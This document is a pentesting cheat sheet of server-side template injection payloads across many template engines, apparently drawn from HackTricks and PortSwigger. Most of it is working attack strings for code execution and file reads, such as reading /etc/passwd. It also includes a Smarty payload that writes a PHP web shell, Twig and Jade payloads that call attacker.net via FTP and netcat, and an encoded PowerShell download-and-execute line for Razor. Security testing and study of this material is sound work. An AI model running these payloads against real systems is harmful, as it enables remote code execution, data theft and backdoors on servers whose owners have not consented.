Server-side template injection is a vulnerability that occurs when an attacker can inject malicious code into a template that is executed on the server.


# Detection
To detect Server-Side Template Injection (SSTI), initially, **fuzzing the template** is a straightforward approach. This involves injecting a sequence of special characters (**`${{<%[%'"}}%\`**) into the template and analysing the differences in the server’s response to regular data versus this special payload.

# Payloads and Exploits
**Major ones noted, for more read the HackTricks site linked*
## Java
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
# Get ENV variables
${T(java.lang.System).getenv()}
```


## FreeMarker Java
```
{{7*7}} = {{7*7}}
${7*7} = 49
#{7*7} = 49 -- (legacy)
${7*'7'} Nothing
${foobar}

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

## Spring Framework - Java
```java
{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
# Read /etc/passwd
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Expression Language (EL) - Java
Expression Language (EL) is a fundamental feature that facilitates interaction between the presentation layer (like web pages) and the application logic (like managed beans) in JavaEE. It’s used extensively across multiple JavaEE technologies to streamline this communication.
```
${"aaaa"}` - “aaaa”
${99999+1}` - 100000.
#{7*7}` - 49
${{7*7}}` - 49
${{request}}, ${{session}}, {{faceContext}}
```


## Smarty - PHP

```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

## Twig - PHP

```php
{{7*7}} = 49
${7*7} = ${7*7}
{{7*'7'}} = 49
{{1/0}} = Error
{{foobar}} Nothing

# Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

# File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

# Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

## Jade - NodeJS

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}`
```

## ERB - Ruby
```
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7*7 %> = 49
<%= foobar %> = Error

<%= system("whoami") %> # Execute code
<%= Dir.entries('/') %> # List folder
<%= File.open('/etc/passwd').read %> # Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```


## Tornado Python
```
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777

# Full chain below :
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}






{{os.system('whoami')}}
{{os.system('whoami')}}
```

## Jinja2 - Python

```
# Filter bypass
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")

# Normal
{{7*7}} = Error
${7*7} = ${7*7}
{{foobar}} Nothing
{{4*4}}[[5*5]]
{{7*'7'}} = 7777777
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
<div data-gb-custom-block data-tag="debug"></div>

# RCE
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```
```
# Full chain: 
{% raw %}
{% debug %}
{% endraw %}







{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```

### More
- [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)


## Razor - .NET
```
- `@(2+2) <= Success
- `@() <= Success
- `@("{{code}}") <= Success
- `@ <=Success
- `@{} <= ERROR!
- `@{ <= ERRROR!
- `@(1+2)
- `@( //C#Code )
- `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
- `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
```


## ASP
```
<%= 7*7 %>` = 49
<%= "foo" %>` = foo
<%= foo %>` = Nothing
<%= response.write(date()) %>` = <Date>
```


# References
- [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.htm;)
- [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)